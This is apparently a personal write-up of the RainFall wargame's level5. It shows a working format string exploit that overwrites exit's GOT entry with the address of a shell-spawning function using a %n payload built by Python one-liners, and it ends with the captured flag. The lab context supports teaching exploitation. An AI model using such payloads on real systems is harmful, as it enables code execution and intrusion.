Ok so this one is tricky

Main calls N that uses fgets and printf, so it's probably printf that we should attack.
There is also another function o that calls a bash instance. We need to reach that somehow.

But the functions don't return they straight up exit.

I guess we should try to replace the exit function address with o
So we need to find where the exit address is on the stack, there is two exit functions at addresses 0804a014 and 0804a004 it seems, lets try to find one of them

None found

Turns out exit is an external function, and we can find its address with objdump -R or by looking a bit more in ghydra 0x08049838

So now the plan is to override the value at this address with o address 0x080484a4

>>> struct.pack('<I', 0x08049838)
b'8\x98\x04\x08'



level5@RainFall:~$ python -c 'print ("aaaa " + "%x " *10)' | ./level5
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078

Our input value is at index 4

python -c 'print("8\x98\x04\x08" + "%4$n" )


And we need to add the proper padding to recreate the good value, 0x080484a4 in decimal is 134513828 so remove 4 for the first bytes 134513824


python -c 'print("8\x98\x04\x08" + "%134513824d%4$n" )' > /tmp/exploit3

cat /tmp/exploit3 - | ./level5

d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31